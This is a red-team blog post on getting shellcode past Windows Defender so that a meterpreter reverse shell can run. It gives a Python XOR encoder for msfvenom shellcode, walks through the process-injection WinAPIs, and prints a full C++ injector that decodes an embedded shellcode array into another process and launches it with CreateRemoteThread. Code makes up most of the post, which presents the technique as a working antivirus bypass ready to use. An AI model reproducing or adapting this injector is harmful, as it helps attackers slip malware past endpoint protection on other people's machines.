---
layout: post
title: "How to Bypass Windows Defender"
featured-img: Bypass_Windows_Defender\background
categories: [C/C++, Shellcode, Redteam, Windows Defender]
---

Hey yo I am back with a new blog post. In this post I am going to talk about how to bypass the windows defender to run your meterpreter reverse shell.


# SUMMARY

I am going to use the previous blog post technique [HERE](https://xret2pwn.github.io/process-inection/) but i will add one/two thing(s) which is i will xor my shell code and i will xor again while writing the shellcode into the memory.



# SHELLCODE

I'm created a shellcode through msfvenom that's popup a message box. After creating the shellcode i will xor it.  
The following script is a python to encode my shellcode.

```py
raw_shellcode = "!Replace me with your shellcode"
enc_shellcode = []
print ("[+] Shellcode is encoding")
for opcode in raw_shellcode:
        enc_opcode = (ord(opcode) ^ 0x41)
        enc_shellcode.append(enc_opcode)


print ("========================Shellcode========================\n\n")
print ("".join(["\\x{0}".format(hex(abs(i)).replace("0x", "")) for i in enc_shellcode]))
print ("\n\n========================Shellcode========================")

```

![screenshot_1](/assets/img/posts/Bypass_Windows_Defender/xor_python_script.png)

So now i will generate my encoded shellcode  

![screenshot_2](/assets/img/posts/Bypass_Windows_Defender/encoded_shellcode.png)


# WINAPIs

Our shellcode is ready now so let's create our process injection binary.  
But firstly i will describe some winapis we will use it.  


## OpenProcess

```cpp
HANDLE OpenProcess(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);
```
I am going to use **OpenProcess** to open a process by giving it the PID of that process. because the main idea of process injection is a create a new allocation space for the shellcode in a local process then write the shellcode in that allocation and execute it so before creating a new allocation into the memory you need to open this process first make sense right?  

NOTE:  
You need to close the opened handle through **CloseHandle()**

## VirtualAllocEx

```cpp
LPVOID VirtualAllocEx(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
```
I am going to use **VirtualAllocEx** to allocate a new memory space for my shellcode in anther process.  

Why i used **VirtualAllocEx** not **VirtualAlloc**?  
Because I need to allocate memory space in another process address space, catch it!  

Basically you can use **VirtualAlloc** for your current process but **VirtualAllocEx** for another local process.  


## WriteProcessMemory

```cpp
BOOL WriteProcessMemory(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);
```

I am going to use **WriteProcessMemory** to write the shellcode in new allocation which is I created in another process through **VirtualAllocEx**  


## VirtualProtectEx

```cpp
BOOL VirtualProtectEx(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flNewProtect,
  PDWORD lpflOldProtect
);
```

I am going to use **VirtualProtectEx** to change the protection permission 

## CreateRemoteThread 

```cpp
HANDLE CreateRemoteThread(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);
```

I am going to use **CreateRemoteThread** to create a thread that runs in the virtual address space of another process and optionally specify extended attributes.    

What is the difference between **CreateThread** and **CreateRemoteThread**?  

CreateThread is only allows you to create a thread for the current process.  

CreateRemoteThread is allows you to create a thread for anther local process.


# PWN

After discussing some WINAPIs we will create our process injection binary that's bypass the windows defender let's start with creating our CPP.  

There is just one step I would like to discuss it before writing the code which is i will decode the shellcode opcode by opcode.   

```cpp
#include <stdio.h>
#include <Windows.h>

int main(int argc, char* argv[])
{
    unsigned char shellcode[] = "\x98\xaa\xda\x98\x35\x65\xb5\x70\x93\xf3\x36\x70\x88\x25\xca\x30\x71\xca\x37\x4d\xca\x37\x5d\xca\x7\x49\xca\x3f\x61\xca\x77\x79\xe\x59\x34\xb2\x18\x40\x90\xbe\xa0\x21\xca\x2d\x65\x65\xca\x4\x7d\xca\x15\x69\x39\x40\xab\xca\xb\x59\xca\x1b\x61\x40\xaa\xa2\x75\x8\xca\x75\xca\x40\xaf\x70\xbe\x70\x81\xbd\xed\xc5\x81\x35\x46\x80\x8e\x4c\x40\x86\xaa\xb5\x7a\x3d\x65\x69\x34\xa0\xca\x1b\x65\x40\xaa\x27\xca\x4d\xa\xca\x1b\x5d\x40\xaa\xca\x45\xca\x40\xa9\xc8\x5\x65\x5d\x20\x82\xf3\x49\x68\x95\xc8\xa4\xc8\x83\x29\xcf\xf\x4f\xad\x13\xa9\xde\xbe\xbe\xbe\xc8\x4\x45\xfa\x3f\x99\xa3\x32\xc6\x5d\x65\x13\xa9\xcf\xbe\xbe\xbe\xc8\x4\x49\x29\x2d\x2d\x61\x0\x29\x72\x73\x6f\x25\x29\x34\x32\x24\x33\x71\x9a\xc9\x1d\x65\x4b\xc8\xa7\x17\xbe\x14\x45\xc8\x83\x11\xfa\xe9\xe3\xc\xfd\xc6\x5d\x65\x13\xa9\x1e\xbe\xbe\xbe\x29\x2e\x39\x19\x61\x29\x20\x26\x24\x3\x29\xc\x24\x32\x32\x70\x9a\xc9\x1d\x65\x4b\xc8\xa2\x29\x31\x36\x2f\x19\x29\x13\x24\x35\x73\x70\x88\xc9\xd\x65\x46\xc8\xa0\x70\x93\x13\x12\x10\x13\xbe\x91\x70\x81\x11\xbe\x14\x49";

    HANDLE processHandle;
    HANDLE remoteThread;
    PVOID remoteBuffer;
    DWORD oldPerms;
    DWORD PID = 16772;
    printf("Injecting to PID: %i", PID);
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ);

    int i;
    int n = 0;
    for (i = 0; i <= sizeof(shellcode); i++) {
        char dec_opcode = shellcode[i] ^ 0x41;
        if (WriteProcessMemory(processHandle, (char*)remoteBuffer + n, &dec_opcode, 1, NULL)) {
            n++;

        }
    }
    VirtualProtectEx(processHandle, (LPVOID)sizeof(processHandle), sizeof(shellcode), PAGE_READONLY, &oldPerms);
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    CloseHandle(processHandle);

    return 0;
}
```

![screenshot_3](/assets/img/posts/Bypass_Windows_Defender/Final_code.png)


In the for loop I decoded the shellcode with writing the opcode into the memory immediately.  
So let's compile it and see what will happen?  


![screenshot_4](/assets/img/posts/Bypass_Windows_Defender/Windows_Defender_Bypassed.png)

Yup we have been bypassed the windows defender.🔥🔥🔥

_____________________________________________  

  
   


|   Authors    | Twitter | LinkedIn |
| ----------- | ----------- |----------- |
| Hazem Hisham (Ret2pwn) | [@Twitter](https://twitter.com/RET2_pwn) |[@LinkedIn](https://www.linkedin.com/in/hazem-hesham/) |





   

<a href="https://www.buymeacoffee.com/ret2pwn" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>